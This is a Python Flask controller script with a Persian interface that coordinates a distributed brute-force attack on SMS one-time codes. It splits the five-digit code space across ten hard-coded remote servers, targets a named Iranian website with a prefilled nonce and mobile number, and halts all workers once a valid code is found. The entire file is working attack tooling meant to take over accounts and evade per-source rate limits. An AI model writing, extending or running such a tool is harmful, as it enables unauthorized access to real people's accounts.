import requests
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit
import threading

app = Flask(__name__)
socketio = SocketIO(app)

# لیست سرورهای ریموت
REMOTE_SERVERS = [
    "http://63.142.254.127:5000",
    "http://63.142.246.30:5000",
    "http://185.189.27.75:5000",
    "http://185.189.27.62:5000",
    "http://185.185.126.164:5000",
    "http://185.183.182.72:5000",
    "http://185.189.27.11:5000",
    "http://185.183.182.217:5000",
    "http://185.183.182.137:5000",
    "http://104.251.219.67:5000/",
    # اگه سرور دهم داری، اینجا اضافه کن
]

# رنج‌ها برای هر سرور (بر اساس تعداد سرورها تنظیم می‌شه)
RANGES = [
    (0, 10000),
    (10000, 20000),
    (20000, 30000),
    (30000, 40000),
    (40000, 50000),
    (50000, 60000),
    (60000, 70000),
    (70000, 80000),
    (80000, 90000),  # 9 تا سرور داریم، این تنظیم شده
    (90000, 99999), 
]

progress_log = []
found_success = False

def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
    """ارسال درخواست به سرور ریموت"""
    global found_success
    try:
        response = requests.post(
            f"{server_url}/start",
            json={"host": host, "nonce": nonce, "mobile": mobile, "connections": connections, "startRange": start_range, "endRange": end_range},
            timeout=10
        )
        response.raise_for_status()
        progress_log.append(f"Request sent to {server_url} for range {start_range}-{end_range}")
        socketio.emit('update_progress', {'log': progress_log[-1]})
    except requests.exceptions.RequestException as e:
        progress_log.append(f"Failed to send request to {server_url}: {str(e)}")
        socketio.emit('update_progress', {'log': progress_log[-1]})

def stop_all_servers():
    """توقف همه سرورها"""
    global found_success
    for server in REMOTE_SERVERS:
        try:
            requests.post(f"{server}/stop", timeout=5)
            progress_log.append(f"Stop request sent to {server}")
            socketio.emit('update_progress', {'log': progress_log[-1]})
        except requests.exceptions.RequestException as e:
            progress_log.append(f"Failed to stop {server}: {str(e)}")
            socketio.emit('update_progress', {'log': progress_log[-1]})

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <title>بررسی کد OTP - سرور مرکزی</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
        <style>
            body { direction: rtl; font-family: Arial, sans-serif; }
            #progress { height: 300px; overflow-y: auto; }
            .range-option { transition: all 0.2s; }
            .range-option:hover { background-color: #e5e7eb; }
        </style>
    </head>
    <body class="bg-gray-100 p-6">
        <div class="max-w-2xl mx-auto bg-white p-6 rounded-lg shadow-lg">
            <h1 class="text-2xl font-bold text-center mb-6">بررسی کد OTP - سرور مرکزی</h1>
            <form id="form" class="space-y-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700">هاست:</label>
                    <input type="text" id="host" class="mt-1 block w-full p-2 border rounded" value="www.arzanpanel-iran.com">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">Nonce:</label>
                    <input type="text" id="nonce" class="mt-1 block w-full p-2 border rounded" value="9d6178e07d">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
                    <input type="text" id="mobile" class="mt-1 block w-full p-2 border rounded" value="09039495749">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
                    <input type="number" id="connections" class="mt-1 block w-full p-2 border rounded" value="20">
                </div>
                <div class="flex space-x-4">
                    <button type="button" id="start" class="w-full bg-green-500 text-white p-2 rounded hover:bg-green-600">شروع</button>
                    <button type="button" id="stop" class="w-full bg-red-500 text-white p-2 rounded hover:bg-red-600" disabled>توقف</button>
                </div>
            </form>
            <div class="mt-6">
                <h2 class="text-lg font-semibold">پیشرفت:</h2>
                <div id="progress" class="bg-gray-50 p-4 rounded border text-sm"></div>
            </div>
        </div>

        <script>
            const socket = io();
            const form = document.getElementById('form');
            const startBtn = document.getElementById('start');
            const stopBtn = document.getElementById('stop');
            const progressDiv = document.getElementById('progress');
            const maxLogs = 20;

            socket.on('connect', () => {
                console.log('Connected to WebSocket');
            });

            socket.on('update_progress', function(data) {
                console.log('Received update:', data);
                const log = document.createElement('p');
                log.textContent = data.log;
                progressDiv.appendChild(log);
                while (progressDiv.children.length > maxLogs) {
                    progressDiv.removeChild(progressDiv.firstChild);
                }
                progressDiv.scrollTop = progressDiv.scrollHeight;
            });

            startBtn.addEventListener('click', () => {
                const host = document.getElementById('host').value;
                const nonce = document.getElementById('nonce').value;
                const mobile = document.getElementById('mobile').value;
                const connections = document.getElementById('connections').value;

                fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host, nonce, mobile, connections })
                }).then(response => {
                    if (response.ok) {
                        startBtn.disabled = true;
                        stopBtn.disabled = false;
                    } else {
                        console.error('Start failed:', response.status);
                    }
                }).catch(error => console.error('Fetch error:', error));
            });

            stopBtn.addEventListener('click', () => {
                fetch('/stop', {
                    method: 'POST'
                }).then(() => {
                    startBtn.disabled = false;
                    stopBtn.disabled = true;
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/start', methods=['POST'])
def start():
    global progress_log, found_success
    data = request.get_json()
    host = data['host']
    nonce = data['nonce']
    mobile = data['mobile']
    connections = int(data['connections'])

    found_success = False
    progress_log = []
    progress_log.append("Starting distribution to remote servers...")
    socketio.emit('update_progress', {'log': progress_log[-1]})

    threads = []
    for i, server in enumerate(REMOTE_SERVERS):
        start_range, end_range = RANGES[i]
        thread = threading.Thread(target=send_to_remote, args=(server, host, nonce, mobile, connections, start_range, end_range))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    return '', 204

@app.route('/stop', methods=['POST'])
def stop():
    global progress_log
    stop_all_servers()
    return '', 204

@socketio.on('remote_log')
def handle_remote_log(data):
    """دریافت لاگ از سرورهای ریموت"""
    global found_success
    log = data['log']
    progress_log.append(f"[Remote] {log}")
    socketio.emit('update_progress', {'log': progress_log[-1]})
    
    # اگه کد درست پیدا شده، همه سرورها رو متوقف کن
    if "Success with code" in log or "Process stopped because a successful code was found" in log:
        found_success = True
        progress_log.append("Success found on a remote server! Stopping all servers...")
        socketio.emit('update_progress', {'log': progress_log[-1]})
        stop_all_servers()

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
